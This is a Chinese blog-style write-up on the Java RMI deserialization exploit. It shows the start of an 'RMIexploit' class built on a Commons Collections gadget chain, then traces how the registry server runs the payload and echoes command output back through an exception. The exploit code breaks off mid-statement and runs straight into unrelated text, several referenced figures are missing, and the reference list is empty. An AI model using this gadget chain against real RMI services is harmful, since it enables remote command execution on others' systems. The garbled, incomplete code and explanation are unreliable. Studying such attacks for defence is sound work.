这篇文章主要用于学习 RMI 的反序列化利用的流程原理，在网上搜了一大堆的 RMI
利用资料，大多仅仅是讲的利用方法，没有找到到底为啥能这么用，即使有些涉及到一些原理的文章，也写得过于高端了....看不大懂，只能自己去跟一根整个利用流程，请各位大佬轻喷....
* * *
### 网上流传的基于报错回显的 payload
先抛出 rmi 反序列化的exp
本地：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.lang.annotation.Target;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.net.URLClassLoader;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.HashMap;
    import java.util.Map;
    public class RMIexploit {
        public static Constructor getFirstCtor(final String name)
            throws Exception {
            final Constructor ctor = Class.forName(name).getDeclaredConstructors()[0];
            ctor.setAccessible(true);
            return ctor;
        }
        public static void main(String[] args) throws Exception {
            if (args.length  bind
  * 1 -> list
  * 2 -> lookup
  * 3 -> rebind
  * 4 -> unbind
此处的 var6 变量就是之前 RMI Server 新生成的 RegistryImpl 对象，所以在以上 5 中操作过程中，其实际上都是操作的 RMI
Server 的 RegistryImpl
然后因为在 payload 里命令执行完成后，直接抛出的异常并带入命令执行结果，所以在 Proxy 成员 invocationHandler
反序列化的过程中（也就是在 readObject 的过程中），直接抛错了，并带回 RMI 客户端，形成利用报错回显命令执行结果
我们可以继续看看抛出异常后的情况  
被 IOException 抓住后，继续抛出 UnmarshalException，跳回 oldDespatch 中  
在 oldDespatch 中的异常处理流程如下图：
先获取了 ObjectOuput 然后用 ServerException 包装一下，最后将异常反馈给 RMI Client  
第一个红框里， getResultStrem 带入的参数是 false ，跟进去看看
var1 为 false ，进入 else 条件，在传送回 Client 异常前，写回一个 2  
这里就和之前在 RMI Client 中分析的吻合了，如果 Client 中得到的是 2 的返回，那么回接受来自 Server 的异常并将其打印
* * *
整个流程已经全部梳理完，有啥叙述不清、错误的地方欢迎指出~
参考资料：  